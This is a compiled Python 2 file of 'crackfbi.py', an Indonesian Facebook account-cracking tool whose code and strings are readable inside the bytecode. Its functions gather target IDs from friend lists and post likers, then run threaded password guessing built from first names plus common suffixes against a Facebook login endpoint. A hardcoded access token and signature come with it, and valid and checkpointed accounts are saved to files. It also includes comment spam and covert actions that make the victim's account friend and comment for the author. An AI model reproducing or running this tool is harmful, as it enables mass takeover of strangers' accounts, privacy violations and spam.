ó
ùbò_c           @   s²  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l m Z d  d l m Z y d  d l Z Wn e k
 rø e  j d  n Xy d  d l Z Wn e k
 r)e  j d  n Xy d  d l Z Wn+ e k
 rge  j d  e  j d  n Xd  d l m Z d  d	 l m Z e e  e j d
  e j   Z e j e  e j e j j   d d d0 g e _ e  j d  e Z  d   Z! e	 j" d e!  Z# e# j$   e	 j" d e!  Z# e# j$   e j% d  e& Z  d   Z' d   Z( d   Z) d   Z* d Z+ d   Z, d Z- g  Z. g  Z/ g  a0 g  a1 g  Z2 g  Z3 g  Z4 g  Z5 g  Z6 g  Z7 g  Z8 g  Z9 g  Z: g  Z; g  Z< d Z= d Z> d   Z? d   Z@ d   ZA d   ZB d    ZC d!   ZD d"   ZE d#   ZF d$   ZG d%   ZH d&   ZI d'   ZJ d(   ZK d)   ZL d*   ZM d+   ZN d,   ZO d-   ZP d.   ZQ eR d/ k r®eE   e?   n  d S(1   iÿÿÿÿN(   t
   ThreadPool(   t   datetimes   pip2 install mechanizes   pip2 install bs4s   pip2 install requestss   python2 wic.py(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16t   clearc          C   sb   x[ t  j d d d d g  D]> }  t r, Pn  t j j d |   t j j   t j d  q Wd  S(   Ns   [1;96m|s   [1;92m/s   [1;95m-s   [1;91m\s	   loading g¹?(	   t	   itertoolst   cyclet   donet   syst   stdoutt   writet   flusht   timet   sleep(   t   c(    (    s   crackfbi.pyt   animate    s    "t   targetg      à?c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   t   osR
   t   exit(    (    (    s   crackfbi.pyt   keluar2   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t |  d  | 7} q Wt |  S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   crackfbi.pyt   acak7   s
    0c         C   s~   d } xA | D]9 } | j  |  } |  j d | d t d |   }  q W|  d 7}  |  j d d  }  t j j |  d  d  S(   NR   s   !%ss   %s;i   R   s   !0s   
(   t   indext   replacet   strR
   R   R   (   R   R   R    t   j(    (    s   crackfbi.pyR   ?   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R
   R   R   R   R   R   (   t   zt   e(    (    s   crackfbi.pyt   jalanI   s    sZ  
[1;92m      ââ¦âââââ¬âââ¬ââ   âââââ
[1;92m       âââââ¤ââ¬âââ´âââââ â£ â â©â
[1;92m      ââ©ââ´ â´â´âââ´ â´   â  âââ v N.E.W
[1;93m ââââââââââââââââââââââââââââââââââââââââââ
[1;96m         Script by. MUHAMAD BADRU WASIH
[1;96m             New Tools Drak FB
[1;96m                 04/01/2021
[1;93m ââââââââââââââââââââââââââââââââââââââââââc          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s7   [0;97m[[0;93mâ[0;97m][0;93m Sedang Masuk[0;97m i   (   R
   R   R   R   R   (   t   titikt   o(    (    s   crackfbi.pyt   tikY   s
      i    s   [31mNot Vulns	   [32mVulnc           C   s;   t  j d  t GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s3   [0;97m â                                     âs_   [0;97m  [[0;97m01[0;97m][0;96m[1;93m Login Menggunakan Token[1;97m{[1;92mAnti CP[1;97m}sU   [0;97m  [[0;97m02[0;97m][0;96m[1;93m Login Manual[1;97m{[1;91mRawan CP[1;97m}sX   [0;97m  [[0;97m03[0;97m][0;96m[1;93m Cara Ambil Token[1;97m{[1;92mAnti CP[1;97m}s0   [0;97m  [[0;91m00[0;97m][0;96m[1;91m Keluars3   [0;97m â                                     â(   R   t   systemt   logot   pilih_masuk(    (    (    s   crackfbi.pyt   masukt   s    c          C   s¿   t  d  }  |  d k r' d GHt   n |  d k s? |  d k rI t   nr |  d k sa |  d k rk t   nP |  d k s |  d	 k r t   n. |  d
 k s¥ |  d k r¯ t   n d GHt   d  S(   Ns-   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m][0;97m R   s+   [0;97m[[0;91m![0;97m] Isi Yg Benar Bro !t   1t   01t   2t   02t   3t   03t   0t   00(   t	   raw_inputR.   t   tokenzt   manualt   ambil_tokenR   (   t   msuk(    (    s   crackfbi.pyR.      s    




c          C   sË   t  j d  t GHt d  }  y| t j d |   } t j | j  } | d } t	 d d  } | j
 |   | j   d GHt d  t  j d	  t   Wn* t k
 rÆ d
 GHt j d  t   n Xd  S(   NR   s/   [0;97m[[0;39m?[1;93m] [0;39mToken : [0;93ms+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s0   [0;97m[[0;39mâ[0;97m][1;92m Login Berhasils"   [1;97mJANGAN LUPA SUBSCRIBE YA :)s2   xdg-open https://youtube.com/c/MuhamadBadruOFFCIALs-   [0;97m[[0;39m![0;97m] [1;92mToken Salah !g{®Gáz?(   R   R,   R-   R8   t   requestst   gett   jsont   loadst   textt   openR   t   closeR(   t   menut   KeyErrorR   R   R/   (   t   tokett   otwt   at   namat   zedd(    (    s   crackfbi.pyR9      s$    


c           C   sJ   t  j d  t GHd d GHt d  t  j d  t j d  t   d  S(   NR   i2   s
   [1;94mâs2           [1;92mAnda Akan Di Arahkan Ke Youtube ...s%   xdg-open https://youtu.be/M_Y8n2I_LXsi   (   R   R,   R-   R(   R   R   R/   (    (    (    s   crackfbi.pyR;   ¨   s    	
c          C   s¹  t  j d  y t d d  }  t   Wnt t f k
 r´t  j d  t GHd GHt d  } t d  } t   y t	 j d  Wn  t
 j k
 r¦ d GHt   n Xt t	 j _ t	 j d	 d
  | t	 j d <| t	 j d <t	 j   t	 j   } d | k rVy.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d 6d  d! 6} t j d"  } | j |  | j   } | j i | d# 6 d$ } t j | d% | } t j | j  }	 t d d&  }
 |
 j |	 d'  |
 j   d( GHt  j d)  t j d* |	 d'  t   WqVt j  j! k
 rRd GHt   qVXn  d+ | k rd, GHt  j d-  t" j# d.  t   qµd/ GHt  j d-  t" j# d.  t$   n Xd  S(0   NR   s	   login.txtt   rsG   [1;96m      [â¡] [1;91mâââLogin Akun Baruâââ[1;93m[â¡]s+   [1;93m[+] [0;34mID/Email [1;95m: [1;95ms+   [1;95m[+] [0;34mPassword [1;93m: [1;93ms   https://m.facebook.coms$   
[1;96m[!] [1;91mTidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR0   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR6   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens    
[1;96m[â] [1;92mLogin HogaisA   xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOAsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=t
   checkpoints4   
[1;96m[!] [1;91mAkun Sepertina Terkena checkpoints   rm -rf login.txti   s+   
[1;96m[!] [1;91mPassword/Email Salah Bro(%   R   R,   RC   RE   RF   t   IOErrorR-   R8   R+   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestR>   R?   R@   RA   RB   R   RD   t   postt
   exceptionsR   R   R   R/   (   RG   t   idt   pwdt   urlR^   t   dataR   RI   RL   R&   t   unikers(    (    s   crackfbi.pyR:   ´   sh    
S

c          C   s  y t  d d  j   }  Wn# t k
 r> d GHt j d  n Xd } d } d } d } d } d } d } t j d | d |   t j d | d	 | d |   t j d | d
 | d |   t j d | d	 | d |   t j d | d
 | d |   t   d  S(   Ns	   login.txtRL   s   [0;39m[!] Token invalids   rm -rf login.txtR   s7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s   https://graph.facebook.com/s   /comments/?message=s   /reactions?type=(   RC   t   readRb   R   R,   R>   Rq   RE   (   RG   t   unat   komt   reacRq   t   post2t   kom2t   reac2(    (    s   crackfbi.pyt	   bot_komení   s$    !!!!c          C   so  t  j d  y t d d  j   }  Wn2 t k
 rZ t  j d  t  j d  t   n Xy= t j d |   } t j	 | j
  } | d } | d } Wnf t k
 rÞ t  j d  d GHt  j d  t j d	  t   n# t j j k
 r d
 GHt   n Xt  j d  t GHd GHd | GHd | GHd | d GHd GHd GHd GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s	   login.txtRL   s   rm -rf login.txts+   https://graph.facebook.com/me?access_token=R=   Rs   s   [0;96m[!] [0;91mToken invalidg{®Gáz?s   [!] Tidak ada koneksis   [1;93mâââââââââââââââââââââââââââââââââââââââââââââsB   [0;97m [[0;91mâ[0;97m][0;97m Nama Akun[0;97m     Â·[0;97m sA   [0;97m [[0;91mÂ¤[0;97m][0;97m User ID[0;97m       Â·[0;97m sB   [0;97m [[0;91mâ¢[0;97m][0;97m Tanggal Lahir[0;97m Â·[0;97m t   birthdays   [0;93m âââââââââââââââââââââââââââââââââââââââââââs>   [0;97m [[0;97m01[0;97m][0;97m[0;97m Hack Facebook AccountsF   [0;97m [[0;97m02[0;97m][0;97m[0;97m Crack ID Postingan Grup/Temans0   [0;97m [[0;97m03[0;97m][0;97m[0;97m Dump IDs>   [0;97m [[0;97m04[0;97m][0;97m[0;97m Ikuti Saya di Youtubes@   [0;97m [[0;97m05[0;97m][0;97m[0;97m Ambil ID Lewat Usernames4   [0;97m [[0;97m06[0;97m][0;97m[0;97m Spam Coments/   [0;97m [[0;91m00[0;97m][0;97m[0;97m Logouts   [0;93m âââââââââââââââââââââââââââââââââââââââââââ(   R   R,   RC   Rx   Rb   R/   R>   R?   R@   RA   RB   RF   R   R   Rr   R   R   R-   t   pilih(   RG   RH   RI   RJ   Rs   (    (    s   crackfbi.pyRE     sJ    

		c          C   sI  t  d  }  |  d k r' d GHt   n|  d k s? |  d k rI t   nü |  d k sa |  d k rk t   nÚ |  d k s |  d	 k r t   n¸ |  d
 k s¥ |  d k r¯ t   n |  d k sÇ |  d k rÑ t   nt |  d k sé |  d k ró t   nR |  d k s|  d k r9t j	 d  t
 d  t j	 d  t   n d GHt   d  S(   Ns-   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m][0;97m R   s.   [0;97m[[0;91m![0;97m][0;97m Isi Yg Benar !R0   R1   R2   R3   R4   R5   t   4t   04t   5t   05t   6t   06R6   R7   R   s   Menghapus Tokens   rm -rf login.txt(   R8   R   t   indot   crack_likest   dumpt   sayat   ambil_idt   botkomenR   R,   R(   R   (   Rw   (    (    s   crackfbi.pyR   *  s.    








c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR   s	   login.txtRL   s   [0;96m[!] [0;91mToken Invalids   rm -rf login.txtg{®Gáz?s   [0;97m ââââââââââââââââââââââââââââââââââââââââââsE   [0;97m [[0;97m01[0;97m][0;97m[0;97m Crack dari ID Publik / Temans8   [0;97m [[0;97m02[0;97m][0;97m[0;97m Crack dari Files0   [0;97m [[0;91m00[0;97m][0;97m[0;97m Kembali(   R   R,   RC   Rx   RG   Rb   R   R   R   R-   t
   pilih_indo(    (    (    s   crackfbi.pyR   E  s     c          C   s  t  d  }  |  d k r' d GHt   n|  d k s? |  d k rBt j d  t GHd GHt  d  } y> t j d	 | d
 t  } t j	 | j
  } d | d GHWnI t k
 rÉ d GHt  d  t   n# t j j k
 rë d GHt   n Xt j d	 | d t  } t j	 | j
  } x| d D] } t j | d  q$Wnì |  d k sZ|  d k r t j d  t GHyH d GHt  d  } x0 t | d  j   D] } t j | j    qWWq.t k
 rÖd GHt  d  q.t k
 rüd GHt  d  t   q.Xn. |  d k s|  d k r"t   n d GHt   d t t t   GHd d d  g }	 x0 |	 D]( }
 d! |
 Gt j j   t j d"  qYWd# GHd$ GHd GHd%   } t d&  } | j | t  d' d( GHd) GHd* t t t    d+ t t t!   GHd, GHd' d( GHt  d-  t j d.  d  S(/   Ns-   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m][0;97m R   s1   [0;97m[[0;91m![0;97m][0;97m Isi Yg Benar Bro!R0   R1   R   s   [0;97m ââââââââââââââââââââââââââââââââââââââââââs7   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] User ID Target : s   https://graph.facebook.com/s   ?access_token=s7   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] Nama Akun      : R=   s6   [0;97m[[0;93m![0;97m] ID Publik / Teman Tidak Ada !s   
[ Kembali ]s   [!] Tidak ada koneksi !s   /friends?access_token=Rv   Rs   R2   R3   s9   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] Nama File Target : RL   s*   [0;97m[[0;93m![0;97m] File tidak ada ! s!   
[0;92m[ [0;97mKembali [0;92m]s   [0;97m[!] File tidak ada !R6   R7   s.   [0;97m[[0;91m![0;97m][0;97m Isi Yg Benar !s7   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] Total ID       : s   .   s   ..  s   ... s6   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] Crack Berjalan i   s   
[0;97m ââââââââââââââââââââââââââââââââââââââââââs4   [0;97m [0;40;97m     TO STOP PROCESS,PRESS CTRL+Z c         S   s'  t  j j d j t j   j d    t  j j   |  } y t j	 d  Wn t
 k
 r_ n Xy¹t j d | d t  } t j | j  } | d j   d } t j d | d	 | d
  } t j |  } d | k rd | d | d | d GHt j |  nd | d k rHd | d | d | d GHt j |  nÐ| d j   d } t j d | d	 | d
  } t j |  } d | k rÃd | d | d | d GHt j |  nUd | d k r d | d | d | d GHt j |  n| d j   d } t j d | d	 | d
  } t j |  } d | k r{d | d | d | d GHt j |  nd | d k r¸d | d | d | d GHt j |  n`d }	 t j d | d	 |	 d
  } t j |  } d | k r%d | d |	 d | d GHt j |  nód | d k rbd | d |	 d | d GHt j |  n¶d }
 t j d | d	 |
 d
  } t j |  } d | k rÏd | d |
 d | d GHt j |  nId | d k rd | d |
 d | d GHt j |  nd } t j d | d	 | d
  } t j |  } d | k ryd | d | d | d GHt j |  nd | d k r¶d | d | d | d GHt j |  nbd } t j d | d	 | d
  } t j |  } d | k r#d | d | d | d GHt j |  nõ d | d k r`d | d | d | d GHt j |  n¸ | d j   d } t j d | d	 | d
  } t j |  } d | k rÛd | d | d | d GHt j |  n= d | d k rd | d | d | d GHt j |  n  Wn n Xd  S(   Ns   {}s   [0;97m%H:%M:%St   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R`   s   [0;92m[OK] s    â¢ R=   s   www.facebook.comt	   error_msgs   [0;93m[CP] t   1234t   12345t   sayangt   bangsatt   anjingt   kontolt	   last_name(   R
   R   R   RU   R   t   nowt   strftimeR   R   t   mkdirt   OSErrorR>   R?   RG   R@   RA   RB   t   lowert   urllibt   urlopent   loadt   okst   appendt   cekpoint(   t   argt   userRI   R   t   pass1Rv   R   t   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8(    (    s   crackfbi.pyt   main  s¨    ( i   i-   s   [0;97m=sB   [0;97m[[0;91mâ¢[0;93mâ¢[0;92mâ¢[0;97m] [0;97mSelesai ....sg   [0;97m[[0;91mâ¢[0;93mâ¢[0;92mâ¢[0;97m] [0;97mTotal [0;92mOK[0;97m/[0;93mCP [0;97m: [0;92ms   [0;97m/[0;93msV   [0;97m[[0;91mâ¢[0;93mâ¢[0;92mâ¢[0;97m] [0;97mCP file tersimpan : out/ind1.txts    [0;97m[[0;97m Kembali [0;97m]s   python2 crackfbi.py("   R8   R   R   R,   R-   R>   R?   RG   R@   RA   RB   RF   R   Rr   R   R   Rs   R£   RC   t	   readlinest   stripRb   RE   R$   R   R
   R   R   R   R   R    t   mapR¢   R¤   (   t   teakt   idtt   jokt   opRL   R&   R    t   idlistt   lineR)   R*   R¯   t   p(    (    s   crackfbi.pyR   Y  s|    




  	e	)	
c             sú  t  j d  y t d d  j     Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  t GHd GHt	 d  }  t
 j d	 |  d
    } t j | j  } x# | d D] } t j | d  q¾ Wt d  Wn' t k
 rd GHt	 d  t   n Xd t t t   GHd GHd d d g } x0 | D]( } d | Gt j j   t j d  q>Wd GH  f d   } t d  } | j | t  d d GHd GHd t t t   d t t t   GHd GHd d GHt	 d  t  j d   d  S(!   NR   s	   login.txtRL   s   [0;97m[!] Token invalids   rm -rf login.txtg{®Gáz?s   [0;97m ââââââââââââââââââââââââââââââââââââââââââsC   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] ID Postingan Group / Teman : s   https://graph.facebook.com/s   /likes?limit=5000&access_token=Rv   Rs   sL   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] [0;97mSukses Mengambil ID [0;97m...s4   [0;97m[[0;93m![0;97m] [0;97mID Postingan Salah !s!   
[0;93m[ [0;97mKembali [0;93m]s1   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] Total ID : s1   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] Stop CTRL+Zs   .   s   ..  s   ... s+   [0;97m[[0;93mâ¢[0;97m] Crack Berjalan s2   
[0;97m==========================================c            s%  t  j j d j t j   j d    t  j j   |  } y t j	 d  Wn t
 k
 r_ n Xy·t j d | d    } t j | j  } | d j   d } t j d | d	 | d
  } t j |  } d | k rd | d | d | d GHt j |  nd | d k r~d | d | d | d GHt d d  } | j d | d | d  | j   t j |  n| d j   d } t j d | d	 | d
  } t j |  } d | k rùd | d | d | d GHt j |  nd | d k rld | d | d | d GHt d d  } | j d | d | d  | j   t j |  nª| d j   d }	 t j d | d	 |	 d
  } t j |  } d | k rçd | d |	 d | d GHt j |  n/d | d k rZd | d |	 d | d GHt d d  } | j d | d |	 d  | j   t j |  n¼| d j   d }
 t j d | d	 |
 d
  } t j |  } d | k rÕd | d |
 d | d GHt j |  nAd | d k rHd | d |
 d | d GHt d d  } | j d | d |
 d  | j   t j |  nÎ| d j   d } t j d | d	 | d
  } t j |  } d | k rÃd | d | d | d GHt j |  nSd | d k r6d | d | d | d GHt d d  } | j d | d | d  | j   t j |  nà d } t j d | d	 | d
  } t j |  } d | k r£d | d | d | d GHt j |  ns d | d k rd | d | d | d GHt d d  } | j d | d | d  | j   t j |  n  Wn n Xd  S(   Ns   {}s   [0;97m%H:%M:%SR	   s   https://graph.facebook.com/s   /?access_token=R   R   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R`   s   [1;92m[OK] s    | R=   s   www.facebook.comR   s   [1;92m[CP] s   done/grup.txtRI   s   ID:s    PW:s   
R   s   [1;92m[CP]] R   t   321R   R   (   R
   R   R   RU   R   R   R   R   R   R   R   R>   R?   R@   RA   RB   R   R   R    R¡   R¢   R£   RC   RD   R¤   (   R¥   t   zowet   anR%   t   bos1Rv   t   kot   cekt   bos2t   bos3t   bos4t   bos5t   bos6(   RG   (    s   crackfbi.pyR¯     s¨    ( 





i   i-   s   [0;97m=s.   [0;97m[[0;93mâ¢[0;97m] [0;97mSelesai ....sS   [0;97m[[0;93mâ¢[0;97m] [0;97mTotal [0;92mOK[0;97m/[0;93mCP [0;97m: [0;92ms   [0;97m/[0;93msC   [0;97m[[0;93mâ¢[0;97m] [0;97mCP file tersimpan : done/grup.txts    [0;97m[[0;97m Kembali [0;97m]s   python2 crackfbi.py(   R   R,   RC   Rx   Rb   R   R   t   loginR-   R8   R>   R?   R@   RA   RB   Rs   R£   R(   RF   R   R$   R   R
   R   R   R    R²   R¢   R¤   (   t   tezRL   R&   R    R)   R*   R¯   R¹   (    (   RG   s   crackfbi.pyR   ÿ  sP    
  `	)	
c          C   s   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHt	   d  S(   NR   s	   login.txtRL   s   [0;91m[!] Token not founds   rm -rf login.txtg{®Gáz?s   [0;97m ââââââââââââââââââââââââââââââââââââââââââsD   [0;97m [[0;97m01[0;97m][0;93m[0;97m Ambil ID dari Daftar Teman sF   [0;97m [[0;97m02[0;97m][0;93m[0;97m Ambil ID dari Publik / Teman s1   [0;97m [[0;91m00[0;97m][0;93m[0;97m Kembali (
   R   R,   RC   Rx   Rb   R   R   RE   R-   t
   dump_pilih(   RG   (    (    s   crackfbi.pyR     s     c          C   s   t  d  }  |  d k r' d GHt   nr |  d k s? |  d k rI t   nP |  d k sa |  d k rk t   n. |  d k s |  d	 k r t   n d
 GHt   d  S(   Ns-   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m][0;97m R   s.   [0;97m[[0;91m![0;97m][0;97m Isi Yg Benar !R0   R1   R2   R3   R6   R7   s'   [0;97m[[0;91m![0;97m] Isi Yg Benar !(   R8   RÇ   t   id_temant   idfrom_temanRE   (   t   cuih(    (    s   crackfbi.pyRÇ     s    



c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xy:t  j d  t
 GHd d	 GHt j d
 |   } t j | j  } t d  t d d  } xw | d D]k } t j | d  | j | d d  d t t t   d Gt j j   t j d  d | d GHqì W| j   d GHd t t  GHt d  } t  j d d |  d | GHd GHt d  t  j d  WnÇ t k
 rèd GHt d  t   n¡ t t f k
 rd GHt d  t   nu t k
 r:d  GHt d  t   nO t	 k
 rfd! GHt d  t  j d  n# t j  j! k
 rd" GHt"   n Xd  S(#   NR   s	   login.txtRL   s   [0;97m[!] Token invalids   rm -rf login.txtg{®Gáz?R   i-   s   [0;97m=s3   https://graph.facebook.com/me/friends?access_token=sE   [0;97m[[0;93mâ¢[0;97m] [0;97mMengambil Semua ID Teman [0;97m...s   out/id_teman.txtR   Rv   Rs   s   
s   [0;97m[[0;93ms   [0;97m][0;97m =>g{®Gázt?s   [0;97msB   [0;97m[[0;93mâ[0;97m] [0;97mSukses Mengambil ID [0;97m....s0   [0;97m[[0;93mâ¢[0;97m] [0;97mTotal ID : %ss4   [0;97m[[0;93m?[0;97m] [0;97mSimpan Nama File : s   out/s=   [0;97m[[0;95m+[0;97m] [0;97mFile tersimpan : [0;97mout/s1   [0;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~s    [0;93m[ [0;97mKembali [0;93m]s   python2 crackfbi.pys   [0;91m[!] Gagal membuat files!   
[0;93m[ [0;97mKembali [0;93m]s   [0;97m[!] Terhenti !s   [0;91m[!] Gagal !s;   [0;97m[[0;95m![0;97m][0;97m File anda tidak tersimpan !s   [0;97m[Ã] Tidak ada koneksi !(#   R   R,   RC   Rx   Rb   R   R   RÅ   R   R   R-   R>   R?   R@   RA   RB   R(   t   idtemanR£   R   R$   R   R
   R   R   RD   R8   t   renameR   t   KeyboardInterruptt   EOFErrorRF   Rr   R   R   (   RG   RL   R&   t   bzRI   R	   (    (    s   crackfbi.pyRÈ   ­  sn    	
  
	







c    	      C   s	  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xy°t  j d  t
 GHd GHt d	  } y> t j d
 | d |   } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt j d
 | d |   } t j | j  } t d  d GHt d d  } x{ | d d D]k } t j | d  | j | d d  d t t t   d Gt j j   t j d  d | d GHqmW| j   d GHd t t  GHt d  } t  j d d |  d  | GHt d!  t   WnÍ t	 k
 rdd" GHt d!  t  j d#  n¡ t k
 rd$ GHt d%  t  j d#  nu t t f k
 r¼d& GHt d%  t   nI t k
 râd' GHt d(  t   n# t j  j! k
 rd) GHt"   n Xd  S(*   NR   s	   login.txtRL   s   [0;91m[!] Token not founds   rm -rf login.txtg{®Gáz?R   s   [0;97m ââââââââââââââââââââââââââââââââââââââââââs7   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] User ID Target : s   https://graph.facebook.com/s   ?access_token=s>   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] [0;97mNama Akun      : R=   sD   [0;97m[[0;91mâ¢[0;93mâ¢[0;92mâ¢[0;97m] ID Publik Tidak Ada !s!   
[0;97m[[0;97m Kembali [0;97m]s*   ?fields=friends.limit(50000)&access_token=sC   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m] [0;97mMengambil Semua ID ...s   out/id_teman_from_teman.txtR   t   friendsRv   Rs   s   
s   [0;97m [ [0;97ms%   [0;97m ][0;91m â¢[0;97mâ¢[0;97mg{®Gázt?s   [0;97m sB   [0;97m[[0;93mâ[0;97m] [0;97mSukses Mengambil ID [0;97m....s)   [0;97m[[0;93mâ¢[0;97m] Total ID : %ss4   [0;97m[[0;93m+[0;97m] [0;97mSimpan Nama File : s   out/s1   [0;91m[[0;95mâ[0;97m] File tersimpan : out/s!   
[0;93m[ [0;97mKembali [0;93m]s    [0;97m[!] File Tidak Tersimpan s   python2 crackfbi.pys   [0;97m[!] Error creating files   
[0;91m[ [0;97mBack [0;91m]s   [0;97m[!] Terhentis*   [0;97m[[0;95m![0;97m] Teman tidak ada !s!   
[0;93m[[0;97m Kembali [0;93m]s.   [0;97m[[0;91mâ[0;97m] Tidak ada koneksi !(#   R   R,   RC   Rx   Rb   R   R   RÅ   R   R   R-   R8   R>   R?   R@   RA   RB   RF   R   R(   t   idfromtemanR£   R   R$   R   R
   R   R   RD   RÌ   RÍ   RÎ   Rr   R   R   (	   RG   R´   Rµ   R¶   RL   R&   RÏ   RI   R	   (    (    s   crackfbi.pyRÉ   å  s    

  
	






c          C   s   t  j d  t GHt d  }  d |  } t j |  j } t j d |  j	 d  j
 d  } t j d |  j	 d  } d | GHd	 | d
 GHd  S(   NR   s   Masukkan username > s   https://www.facebook.com/s   Title">(.*?)</i   s
   | Facebooks   profile/(.*?)" s   
NAMA > s   ID   > s   
(   R   R,   R-   R8   R>   R?   RB   t   ret   searcht   groupR±   (   t   uRu   RL   R=   Rs   (    (    s   crackfbi.pyR   &  s    
$	c           C   s1   t  j d  t GHd GHd GHd GHd GHt   d  S(   NR   s   [0;93m ââââââââââââââââââââââââââââââââââââââââââs@   [0;97m [[0;97m01[0;97m][0;93m[0;97m Spam Komen Post Target s1   [0;97m [[0;91m00[0;97m][0;93m[0;97m Kembali (   R   R,   R-   t	   pilih_bot(    (    (    s   crackfbi.pyR   2  s    c          C   s{   t  d  }  |  d k r' d GHt   nP |  d k s? |  d k rI t   n. |  d k sa |  d k rk t   n d GHt   d  S(   Ns-   [0;97m [[0;91mâ¢[0;97mâ¢[0;97m][0;97m R   s+   [0;97m[[0;91m![0;97m] Isi Yg Benar Bro !R0   R1   R6   R7   (   R8   RÖ   t	   spamkomenR   R   (   t   zeed(    (    s   crackfbi.pyRÖ   ;  s    


c          C   sá   y t  d d  j   }  Wn0 t k
 rK d GHt j d  t j d  n Xt j d  t GHt d  } t d  } t t d	   } d
 GHx5 t	 |  D]' } t
 j d | d | d |   q Wd GHt d  } t   d  S(   Ns	   login.txtRL   s&   [37;1m[[31;1m![37;1m] Token invalids   rm -rf login.txts   python2 crackfbi.pyR   s%   [32;1mID Postingan [34;1m=> [37;1ms"   [32;1mKata Kata [34;1m=> [37;1ms   [32;1mLimit [34;1m=> [37;1ms0   [37;1m[[31;1m*[37;1m] [32;1mSpam Berjalan...s   https://graph.facebook.com/s   /comments/?message=s   &access_token=s'   [33;1m[[31;1m*[33;1m] [34;1mSuccesss   [31;1m[Kembali]
(   RC   Rx   Rb   R   R,   R-   R8   t   intt   inputt   rangeR>   Rq   RE   (   t   tokeRq   Rz   t   jmlR   t   balik(    (    s   crackfbi.pyR×   I  s"    %t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(S   R   R
   R   Rd   R   R   R   Rm   RÒ   t	   threadingR@   t   getpassR   t	   cookielibt   multiprocessing.poolR    t   ImportErrorR,   t   bs4R>   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRc   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   t   Threadt   tt   startR   Rf   R   R!   R   R(   R-   R+   t   backt   threadst   berhasilR¤   R¢   t   oket   cpeRs   t   usernameRË   RÑ   t   reaksit
   reaksigrupt   koment	   komengrupt   listgrupt   vulnott   vulnR/   R.   R9   R;   R:   R   RE   R   R   R   R   R   RÇ   RÈ   RÉ   R   R   RÖ   R×   t   __name__(    (    (    s   crackfbi.pyt   <module>   s   ¨
	

			
							9		(			¦				8	A					